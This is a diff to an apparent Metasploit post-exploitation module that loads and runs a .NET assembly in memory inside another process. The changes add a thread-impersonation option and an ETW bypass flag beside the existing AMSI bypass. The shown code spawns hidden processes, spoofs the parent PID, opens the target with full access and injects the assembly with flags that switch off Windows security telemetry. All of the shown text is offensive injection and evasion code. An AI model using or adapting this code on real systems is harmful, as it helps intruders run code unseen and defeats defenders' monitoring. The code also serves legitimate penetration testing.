@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
       'Name' => 'Execute .net Assembly (x64 only)',
       'Description' => '
-        This module execute a .net assembly in memory. Refletctively load the dll that host CLR, than
+        This module execute a .net assembly in memory. Reflectively load the dll that will host CLR, then
         copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
       ',
       'License' => MSF_LICENSE,
@@ -34,9 +34,11 @@ class MetasploitModule < Msf::Post
         OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory', ::File.join(Msf::Config.data_directory, 'execute-assembly')]),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
         OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
+        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation',true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
 	OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
         OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
+        OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
         OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
       ], self.class
     )
@@ -114,9 +116,14 @@ class MetasploitModule < Msf::Post
     if datastore['PID'] > 0
       channelized = false
     end
+    impersonation = true
+    if datastore['USETHREADTOKEN'] == false
+      impersonation = false
+    end
     process = client.sys.process.execute(process_name, nil, {
       'Channelized' => channelized, 
       'Hidden' => true,
+      'UseThreadToken' => impersonation,
       'ParentPid' => datastore['PPID']
     })
     hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
@@ -192,6 +199,7 @@ class MetasploitModule < Msf::Post
     print_status("Host injected. Copy assembly into #{process.pid}...")
     int_param_size = 8
     amsi_flag_size = 1
+    etw_flag_size = 1
     exe_path = gen_exe_path
     assembly_size = File.size(exe_path)
     if datastore['ARGUMENTS'].nil?
@@ -199,11 +207,16 @@ class MetasploitModule < Msf::Post
     else
       argssize = datastore['ARGUMENTS'].size + 1
     end
-    payload_size = assembly_size + argssize + amsi_flag_size + int_param_size
+    payload_size = assembly_size + argssize + amsi_flag_size + etw_flag_size + int_param_size
     assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
     params = [assembly_size].pack('I*')
     params += [argssize].pack('I*')
     if datastore['AMSIBYPASS'] == true
+      params += "\x01"
+    else
+      params += "\x02"
+    end
+    if datastore['ETWBYPASS'] == true
       params += "\x01"
     else
       params += "\x02"
